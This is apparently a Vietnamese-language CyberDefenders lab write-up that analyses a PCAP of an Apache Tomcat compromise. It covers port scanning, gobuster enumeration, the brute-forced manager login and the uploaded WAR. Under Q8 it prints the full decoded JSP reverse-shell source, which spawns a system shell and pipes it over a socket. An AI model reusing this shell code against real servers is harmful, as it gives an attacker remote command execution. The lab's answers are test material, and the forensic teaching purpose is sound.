author: Azaki
published: published
created: 2025-01-09
tags: CyberDefener, Lab, Endpoint Forensics

The SOC team has identified suspicious activity on a web server within the company's intranet. To better understand the situation, they have captured network traffic for analysis. The PCAP file may contain evidence of malicious activities that led to the compromise of the Apache Tomcat web server. Your task is to analyze the PCAP file to understand the scope of the attack.

---
<p style="text-align:right; font-style:italic;">
  Author: <b>@Chadou</b> 
</p>

## Q1: Given the suspicious activity detected on the web server, the PCAP file reveals a series of requests across various ports, indicating potential scanning behavior. Can you identify the source IP address responsible for initiating these requests on our server?

**Yêu cầu:** Xác định địa chỉ IP nguồn thực hiện hành vi quét cổng (scanning) nhắm vào máy chủ web.

Để bắt đầu, chúng ta cần phân tích các luồng giao tiếp (conversations) trong file PCAP.
* Kiểm tra danh sách các IP có số lượng gói tin trao đổi nhiều nhất.
* Cần loại trừ các địa chỉ IP thuộc dải mạng private `10.x.x.x` vì đây là IP của máy local.
* Qua quá trình lọc, địa chỉ IP `14.0.0.120` nổi lên với lưu lượng kết nối đáng ngờ.
![Tomcat Takeover Lab.png](./images/Tomcat%20Takeover%20Lab.png)

Tiếp tục áp dụng bộ lọc (filter) để xem chi tiết các gói tin từ IP này, ta thấy attacker sử dụng giao thức TCP để gửi vô số request đến nhiều cổng (ports) khác nhau trên máy nạn nhân. Dấu hiệu này xác nhận IP `14.0.0.120` chính là nguồn gốc của quá trình quét mạng.
![Tomcat Takeover Lab-1.png](./images/Tomcat%20Takeover%20Lab-1.png)

>14.0.0.120

## Q2: Based on the identified IP address associated with the attacker, can you identify the country from which the attacker's activities originated?

**Yêu cầu:** Xác định quốc gia nguồn gốc của địa chỉ IP tấn công.

Sử dụng công cụ `whois` trên terminal để tra cứu thông tin của địa chỉ IP `14.0.0.120`. Kết quả trả về cho thấy IP này xuất phát từ Trung Quốc (China)
![Tomcat Takeover Lab-2.png](./images/Tomcat%20Takeover%20Lab-2.png)

> China

## Q3: From the PCAP file, multiple open ports were detected as a result of the attacker's active scan. Which of these ports provides access to the web server admin panel?

**Yêu cầu:** Xác định cổng (port) cung cấp quyền truy cập vào bảng điều khiển quản trị (admin panel) của web server.

Sau khi kẻ tấn công quét ra các cổng mở, ta cần tập trung vào các luồng dữ liệu HTTP xuất phát từ IP `14.0.0.120`
* Khi lọc các gói tin HTTP, có thể thấy một request GET gửi đến đường dẫn `/admin`
* Request này tương tác thông qua cổng `8080` của máy chủ
![Tomcat Takeover Lab-3.png](./images/Tomcat%20Takeover%20Lab-3.png)

Bên cạnh đó, các lệnh quản lý khác cũng liên tục được gửi đến thông qua cổng `8080` này, củng cố kết luận đây là cổng dành cho giao diện quản trị
![Tomcat Takeover Lab-4.png](./images/Tomcat%20Takeover%20Lab-4.png)

Vì thế có thể xác định đây là cổng cần tìm

>8080

## Q4: Following the discovery of open ports on our server, it appears that the attacker attempted to enumerate and uncover directories and files on our web server. Which tools can you identify from the analysis that assisted the attacker in this enumeration process?

**Yêu cầu:** Xác định công cụ được kẻ tấn công sử dụng để rà quét (enumerate) thư mục và file trên web server.

Kiểm tra hầu hết các gói tin HTTP mà kẻ tấn công sử dụng để liệt kê và kiểm tra thư mục lẫn file. Tại trường `User-Agent` trong các gói tin này, hệ thống ghi nhận dấu vết của công cụ `gobuster`
![Tomcat Takeover Lab-5.png](./images/Tomcat%20Takeover%20Lab-5.png)

> gobuster

## Q5: After enumerating directories on our web server, the attacker made numerous requests to identify administrative interfaces. Which directory related to the admin panel did the attacker uncover? (Provide the path including the leading slash, e.g. /path)

**Yêu cầu:** Xác định thư mục liên quan đến admin panel mà kẻ tấn công đã phát hiện sau quá trình rà quét.

Quá trình rà quét bằng công cụ đã giúp kẻ tấn công tìm ra một thư mục nhạy cảm. Các gói tin HTTP hiển thị request nhắm vào đường dẫn `/manager`, đây là thư mục dùng để điều khiển bảng quản trị
![Tomcat Takeover Lab-6.png](./images/Tomcat%20Takeover%20Lab-6.png)

> /manager

## Q6: After accessing the admin panel, the attacker brute-forced the login. What credentials did the attacker successfully use? (Provide them in username:password format)

**Yêu cầu:** Xác định thông tin đăng nhập (credentials) mà kẻ tấn công đã brute-force thành công.

Theo dõi chuỗi hành vi, các gói tin tấn công brute-force được nhắm vào định dạng `/manager/html/`. Để tìm thông tin đăng nhập đúng, ta tìm kiếm gói tin cuối cùng có định dạng này ngay trước khi kẻ tấn công truy cập thành công vào bảng điều khiển. 
Từ đó, phân tích cho thấy credentials được sử dụng thành công là `admin:tomcat`
![Tomcat Takeover Lab-7.png](./images/Tomcat%20Takeover%20Lab-7.png)

>admin:tomcat

## Q7: Once inside the admin panel, the attacker attempted to upload a file with the intent of establishing a reverse shell. Can you identify the name of this malicious file from the captured data?

**Yêu cầu:** Xác định tên file độc hại được tải lên để thiết lập reverse shell.

Tiếp tục bám sát đoạn thời gian ngay sau khi đăng nhập thành công, xuất hiện một thao tác upload dữ liệu lên server. Đọc thông tin chi tiết của gói tin này, ta trích xuất được tên file độc hại vừa được tải lên là `JXQOZY.war`
![Tomcat Takeover Lab-8.png](./images/Tomcat%20Takeover%20Lab-8.png)

> JXQOZY.war

## Q8: After the attacker established a reverse shell on our server, the payload connects back to the attacker's machine. From the analysis, what is the callback destination in `IP:port` format?

**Yêu cầu:** Xác định IP và Port đích (callback destination) mà reverse shell kết nối về máy kẻ tấn công.

Để tìm hiểu hành vi của payload, ta dùng data của file vừa tìm được để decode. 
* Khối dữ liệu dạng thô này có chứa header `PK`, là dấu hiệu của định dạng file ZIP
![Tomcat Takeover Lab-9.png](./images/Tomcat%20Takeover%20Lab-9.png)

* Tiến hành giải mã dữ liệu này bằng công cụ **CyberChef**.
![Tomcat Takeover Lab-10.png](./images/Tomcat%20Takeover%20Lab-10.png)

Kiểm tra nội dung bên trong sau khi tải về, ta thấy đây là một backdoor (reverse shell) viết bằng Java dùng để tạo kết nối TCP cho máy nạn nhân đến server để thực thi lệnh. Đoạn mã Java này tuy có gọi tới một socket nhất định nhưng vẫn chưa cung cấp cho chúng ta IP và Port chính xác của máy chủ kẻ tấn công sử dụng để callback.
```java
<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream ns;
    OutputStream vA;

    StreamConnector( InputStream ns, OutputStream vA )
    {
      this.ns = ns;
      this.vA = vA;
    }

    public void run()
    {
      BufferedReader w7  = null;
      BufferedWriter kLz = null;
      try
      {
        w7  = new BufferedReader( new InputStreamReader( this.ns ) );
        kLz = new BufferedWriter( new OutputStreamWriter( this.vA ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = w7.read( buffer, 0, buffer.length ) ) > 0 )
        {
          kLz.write( buffer, 0, length );
          kLz.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( w7 != null )
          w7.close();
        if( kLz != null )
          kLz.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.0.0.142", 80 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
```

Quay trở lại các gói tin trong file PCAP, ta thực hiện follow TCP stream tiếp theo. Phân tích stream này làm lộ ra các lệnh hệ thống mà kẻ tấn công đã thực thi (bao gồm cả lệnh tạo file cron), chứa thông tin mở kết nối từ máy nạn nhân đến server thông qua IP `14.0.0.120` và Port `443`
![Tomcat Takeover Lab-11.png](./images/Tomcat%20Takeover%20Lab-11.png)

>14.0.0.120:443